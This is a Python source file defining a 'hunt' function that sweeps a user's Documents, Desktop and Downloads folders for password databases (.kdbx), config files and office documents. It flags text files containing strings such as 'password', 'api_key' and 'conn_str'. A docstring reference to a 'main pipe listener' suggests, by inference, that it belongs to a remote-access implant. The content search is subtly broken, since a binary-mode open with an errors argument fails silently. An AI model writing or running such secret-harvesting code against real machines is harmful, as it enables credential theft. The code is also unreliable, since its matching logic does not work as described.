import os
import time
from typing import List, Dict, Any, Optional
import threading
from concurrent.futures import ThreadPoolExecutor

DEFAULT_EXTS = ['.pdf', '.docx', '.xlsx', '.kdbx', '.txt', '.conf']
TEXT_EXTS = ['.txt', '.conf', '.xml', '.json']
PATTERNS = [b'password', b'api_key', b'admin', b'conn_str']


def hunt(
    extensions: List[str] = None,
    content: Optional[str] = None,
) -> List[Dict[str, Any]]:
    """Recursively scan user folders for files matching extensions.

    If ``content`` is provided and the file has a textual extension, the file
    will be opened and searched for the keyword or well-known secrets.  This
    function uses a ThreadPoolExecutor internally to parallelise I/O and avoid
    blocking callers (e.g. the main pipe listener).

    Returns a list of dicts with keys 'path','size','mtime' and optionally
    'match' when a content string/pattern was satisfied.  Results are sorted by
    mtime descending (recent first).
    """
    if extensions is None:
        extensions = DEFAULT_EXTS
    home = os.path.expanduser('~')
    targets = [os.path.join(home, d) for d in ['Documents', 'Desktop', 'Downloads']]
    found: List[Dict[str, Any]] = []
    lock = threading.Lock()

    def check_file(path: str):
        try:
            _, ext = os.path.splitext(path)
            ext = ext.lower()
            if ext not in extensions:
                return
            stat = os.stat(path)
            rec: Dict[str, Any] = {
                'path': path,
                'size': stat.st_size,
                'mtime': stat.st_mtime,
            }
            if content and ext in TEXT_EXTS:
                try:
                    with open(path, 'rb', errors='ignore') as f:
                        data = f.read()
                    # case-insensitive search
                    low = data.lower()
                    if content.encode().lower() in low or any(p in low for p in PATTERNS):
                        rec['match'] = True
                    else:
                        return
                except Exception:
                    return
            with lock:
                found.append(rec)
        except Exception:
            pass

    def scan_dir(path: str, executor: ThreadPoolExecutor):
        try:
            for entry in os.scandir(path):
                if entry.name.startswith('.'):
                    continue
                if entry.is_dir(follow_symlinks=False):
                    scan_dir(entry.path, executor)
                else:
                    executor.submit(check_file, entry.path)
        except Exception:
            pass

    with ThreadPoolExecutor(max_workers=8) as executor:
        for t in targets:
            if os.path.isdir(t):
                scan_dir(t, executor)
        executor.shutdown(wait=True)

    found.sort(key=lambda x: x['mtime'], reverse=True)
    return found
